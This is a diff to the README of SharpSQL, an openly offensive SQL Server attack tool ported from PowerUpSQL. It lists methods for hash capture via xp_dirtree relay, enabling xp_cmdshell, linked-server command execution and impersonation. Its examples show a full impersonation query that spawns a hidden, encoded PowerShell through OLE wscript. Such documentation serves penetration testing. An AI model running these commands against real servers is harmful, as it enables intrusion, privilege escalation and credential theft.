@@ -2,62 +2,69 @@
 
 Simple port of PowerUpSQL
 - Methods and options are case-insensitive e.g. `Get-SQLInstanceDomain`/`get-sqlinstancedomain` or `-Instance`/`-instance`
-- `-Instance` required for all methods except `Get-SQLInstanceDomain`
+- `-Instance` required for all methods except `Get-SQLInstanceDomain` and `Check-SQLInstanceDomainAccess`
 
 Thanks to [tevora-threat](https://github.com/tevora-threat) for getting the ball rolling.
-
+This fork builds on the work of [mlcsec](https://github.com/mlcsec).
 <br>
 
 ## Usage
 ```
-SharpSQL by @mlcsec
+SharpSQL fork by jannlemm0913, original by @mlcsec
 
 Usage:
 
-    SharpSQL.exe [Method] [-Instance <sql.server>] [-LinkedInstance <linked.sql.server>] [-Command <whoami>] [-Query <query>]
+    SharpSQL.exe [Method] [-Instance <sql.server>] [-LinkedInstance <linked.sql.server>] [-User <user> -Password <password>] [-Command <whoami>] [-Query <query>]
 
 Options:
 
-    -Instance                  - The instance to taget
-    -db                        - The db to connect to (default: master)
+    -Instance                  - The instance to target
+    -Db                        - The db to connect to (default: master)
     -LinkedInstance            - The linked instance to target
-    -ip                        - The IP to xp_dirtree (share: /pwn)
-    -User                      - The user to impersonate
+    -Ip                        - The IP to xp_dirtree (share: /pwn)
+    -User                      - SQL Server or domain account ("domain\user") to authenticate with.
+    -Password                  - SQL Server or domain account password to authenticate with.
+    -Impersonate               - The database user to impersonate
     -Command                   - The command to execute (default: whoami - Invoke-OSCmd, Invoke-LinkedOSCmd, Invoke-ExternalScript, and Invoke-OLEObject)
     -Query                     - The raw SQL query to execute
-    -help                      - Show help
+    -Verbose                   - Enable verbose output
+    -Help                      - Show help
 
 Methods:
-    Get-SQLInstanceDomain      - Get SQL instances within current domain via user and computer SPNs (no parameters required)
-    Get-Databases              - Get available databases
-    Get-DBUser                 - Get database user via USER_NAME
-    Get-GroupMembership        - Get group member for current user ('guest' or 'sysadmin')
-    Get-Hash                   - Get hash via xp_dirtree, works nicely with impacket-ntlmrelayx
-    Get-ImpersonableUsers      - Get impersonable users
-    Get-LinkedServers          - Get linked SQL servers
-    Get-LinkedPrivs            - Get current user privs for linked server
-    Get-Sysadmins              - Get sysadmin users
-    Get-SystemUser             - Get system user via SYSTEM_USER
-    Get-SQLQuery               - Execute raw SQL query
-    Get-Triggers               - Get SQL server triggers
-    Get-Users                  - Get users from syslogins
-    Get-UserPrivs              - Get current user server privileges
-    Check-Cmdshell             - Check whether xp_cmdshell is enabled on instance
-    Check-LinkedCmdshell       - Check whether xp_cmdshell is enabled on linked server
-    Clear-CLRAsm               - Drop procedure and assembly (run before Invoke-CLRAsm if previous error)
-    Enable-Cmdshell            - Enable xp_cmdshell on instance
-    Enable-LinkedCmdshell      - Enable xp_cmdshell on linked server
-    Invoke-OSCmd               - Invoke xp_cmdshell on instance
-    Invoke-LinkedOSCmd         - Invoke xp_cmdshell on linked server
-    Invoke-ExternalScript      - Invoke external python script command execution
-    Invoke-OLEObject           - Invoke OLE wscript command execution
-    Invoke-CLRAsm              - Invoke CLR assembly procedure command execution
-    Invoke-UserImpersonation   - Impersonate user and execute query
-    Invoke-DBOImpersonation    - Impersonate dbo on msdb and execute query
+    Get-SQLInstanceDomain           - Get SQL instances within current domain via user and computer SPNs (no parameters required)
+    Check-SQLInstanceDomainAccess   - Checks access across all SQL instances within current domain
+    Check-SQLInstanceAccess         - Checks access for specified SQL instance
+    Get-Databases                   - Get available databases 
+    Get-DBUser                      - Get database user via USER_NAME
+    Get-GroupMembership             - Get group membership for current user ('guest' or 'sysadmin')
+    Get-Hash                        - Get hash via xp_dirtree, works nicely with impacket-ntlmrelayx
+    Get-ImpersonableUsers           - Get impersonable users 
+    Get-LinkedServers               - Get linked SQL servers
+    Get-LinkedPrivs                 - Get current user privs for linked server
+    Get-Sysadmins                   - Get sysadmin users
+    Get-SystemUser                  - Get system user via SYSTEM_USER
+    Get-SQLQuery                    - Execute raw SQL query
+    Get-Triggers                    - Get SQL server triggers
+    Get-Users                       - Get users from syslogins
+    Get-UserPrivs                   - Get current user server privileges
+    Check-Cmdshell                  - Check whether xp_cmdshell is enabled on instance
+    Check-LinkedCmdshell            - Check whether xp_cmdshell is enabled on linked server
+    Clear-CLRAsm                    - Drop procedure and assembly (run before Invoke-CLRAsm if previous error)
+    Enable-Cmdshell                 - Enable xp_cmdshell on instance
+    Enable-LinkedCmdshell           - Enable xp_cmdshell on linked server
+    Invoke-OSCmd                    - Invoke xp_cmdshell on instance
+    Invoke-LinkedOSCmd              - Invoke xp_cmdshell on linked server
+    Invoke-ExternalScript           - Invoke external python script command execution 
+    Invoke-OLEObject                - Invoke OLE wscript command execution
+    Invoke-CLRAsm                   - Invoke CLR assembly procedure command execution
+    Invoke-UserImpersonation        - Impersonate database user and execute query
+    Invoke-DBOImpersonation         - Impersonate dbo on msdb and execute query
 
 Examples:
 
     SharpSQL.exe Get-SQLInstanceDomain
+    SharpSQL.exe Check-SQLInstanceDomainAccess -User "sa" -Password "***"
+    SharpSQL.exe Check-SQLInstanceAccess -Instance sql.server -User "DOMAIN\User" -Password "***"
     SharpSQL.exe Get-UserPrivs -Instance sql.server
     SharpSQL.exe Get-Sysadmins -Instance sql.server
     SharpSQL.exe Get-LinkedServers -Instance sql.server
@@ -84,14 +91,14 @@ Examples:
 
 ### OLE Object via Impersonation
 ```
-.\SharpSQL.exe invoke-userimpersonation -instance dc01 -user sa -Query "EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE; DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'powershell -exec bypass -nop -w hidden -enc blahblah';"
+.\SharpSQL.exe invoke-userimpersonation -instance dc01 -impersonate sa -Query "EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE; DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'powershell -exec bypass -nop -w hidden -enc blahblah';"
 ```
 
 ### Impersonation and xp_cmdshell
 ```
-.\SharpSQL.exe invoke-userimpersonation -instance dc01 -user sa -Query "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
+.\SharpSQL.exe invoke-userimpersonation -instance dc01 -impersonate sa -Query "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
 
-.\SharpSQL.exe invoke-userimpersonation -instance dc01 -user sa -Query "EXEC xp_cmdshell 'whoami'"
+.\SharpSQL.exe invoke-userimpersonation -instance dc01 -impersonate sa -Query "EXEC xp_cmdshell 'whoami'"
 ```
 
 ### Command execution via CLR Assembly 
